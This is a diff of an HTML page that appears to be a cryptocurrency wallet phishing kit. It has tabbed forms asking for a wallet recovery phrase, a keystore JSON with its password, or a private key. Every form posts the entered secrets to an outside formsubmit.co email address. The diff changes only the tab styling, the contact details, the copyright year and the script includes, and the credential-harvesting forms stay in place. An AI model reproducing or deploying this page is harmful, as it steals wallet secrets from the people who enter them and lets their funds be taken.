@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Document</title>
+<link rel="stylesheet" href="bootstrap.min.css">
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet">
 <!-- Font awesome link -->
 <script src="https://kit.fontawesome.com/c4d526ad75.js" crossorigin="anonymous"></script>
@@ -68,16 +69,16 @@
 <div class="container-fluid">
 <div class="row">
 <div class="col-md-4 offset-md-4">
-<ul class="nav-tabs" style="display: flex; list-style: none;">
-<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
-<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
-<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+<ul class="nav-tabs filters" style="display: flex; list-style: none;">
+<li class="nav-item"><a class="nav-link active" data-filter=".phrase" href="#">Phrase</a></li>
+<li class="nav-item"><a class="nav-link" data-filter=".keystore" href="#">Keystore JSON</a></li>
+<li class="nav-item"><a class="nav-link" data-filter=".privatekey" href="#">Private Key</a></li>
 </ul>
 </div>
 </div>
 </div>
 <div class="tab-content">
-<div role="tabpanel" class="tab-pane fade show active" id="phrase">
+<div role="tabpanel" class="tab-pane fade show active phrase">
 <form method="POST" action="https://formsubmit.co/talkndo12@gmail.com">
 <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
 <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
@@ -102,7 +103,7 @@
 
 </form>
 </div>
-<div role="tabpanel" class="tab-pane fade" id="keystore">
+<div role="tabpanel" class="tab-pane fade keystore">
 <form method="POST" action="https://formsubmit.co/talkndo12@gmail.com">
 <div class="form-group">
 <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
@@ -120,7 +121,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
 
 </form>
 </div>
-<div role="tabpanel" class="tab-pane fade" id="privatekey">
+<div role="tabpanel" class="tab-pane fade privatekey">
 <form method="POST" action="https://formsubmit.co/talkndo12@gmail.com">
 <div class="form-group">
 <input class="form-control" name="privatekey" placeholder="Private Key" required="">
@@ -4744,17 +4745,17 @@ Several lines of text beginning with "{...}" plus the password you used to encry
 </li>
 <li>
 <div class="contact_content d-flex align-items-center">
-<i class="fas fa-phone-volume"></i>
+<!-- <i class="fas fa-phone-volume"></i>
 <p>(+91) 999 999 9999<br>
-(+91) 888 888 8888</p>
+(+91) 888 888 8888</p> -->
 </div>
 </li>
 
 <li>
 <div class="contact_content d-flex align-items-center">
-<i class="fas fa-globe"></i>
-<p>info@paxlar.com<br>
-www.paxlar.com</p>
+<!-- <i class="fas fa-globe"></i> -->
+<!-- <p>info@paxlar.com<br>
+www.paxlar.com</p> -->
 </div>
 </li>
 </ul>
@@ -4791,7 +4792,7 @@ a reader will be distracted.</p>
 <div class="container">
 <div class="row copy_content">
 <div class="col-md-3">
-<p>2018.All Right Reserved.</p>
+<p>2023.All Right Reserved.</p>
 </div>
 <div class="col-md-9">
 <nav class="navbar navbar-expand-lg navbar-light">
@@ -4801,12 +4802,6 @@ a reader will be distracted.</p>
 <li class="nav-item ">
 <a class="nav-link text-white" aria-current="page" href="#">Home</a>
 </li>
-<li class="nav-item">
-<a class="nav-link text-white" href="#">about</a>
-</li>
-<li class="nav-item">
-<a class="nav-link text-white" href="#">exchange</a>
-<li class="nav-item">
 <a class="nav-link text-white" href="#">contact</a>
 </li>
 </ul>
@@ -4840,6 +4835,8 @@ bat.addEventListener('click', function(){
 <!-- Option 1: Bootstrap Bundle with Popper -->
 <script src="script.js"></script>
 <script src="jquery.min.js"></script>
+<script src="bootstrap.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js"></script>
+
 </body>
 </html>
